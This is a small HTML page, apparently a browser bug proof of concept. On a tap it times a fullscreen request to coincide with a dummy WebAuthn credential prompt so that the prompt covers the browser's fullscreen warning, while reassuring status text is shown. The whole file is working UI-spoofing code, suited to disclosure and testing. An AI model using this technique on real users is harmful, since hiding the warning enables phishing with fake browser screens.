<meta name="viewport" content="width=device-width, initial-scale=1"/>

<html onclick="webAuthOverlapFS()">
  <h2 id="message">Tap anywhere to overlap the fullscreen notification</h2>
</html>

<script>
  async function webAuthOverlapFS() {
    setTimeout(function() { document.documentElement.requestFullscreen() }, 350)
    
    try {
        document.getElementById("message").innerText = "Loading, please wait..."

        setTimeout(function() {
          document.getElementById("message").innerText = "Ok, good to go!"
        }, 2820)

        const publicKey = await generatePublicKey();
        const credential = await navigator.credentials.create({ publicKey });

      } catch (error) {
      }

    async function generatePublicKey() {
      const challenge = new Uint8Array(32);
      crypto.getRandomValues(challenge);

      return {
        challenge,
        rp: {
          name: 'Example'
        },
        user: {
          id: new Uint8Array(16),
          name: 'example@example.com',
          displayName: 'Example User'
        },
        pubKeyCredParams: [
          { type: 'public-key', alg: -7 }
        ],
        timeout: 60000,
        attestation: 'direct'
      };
    }
  }
</script>
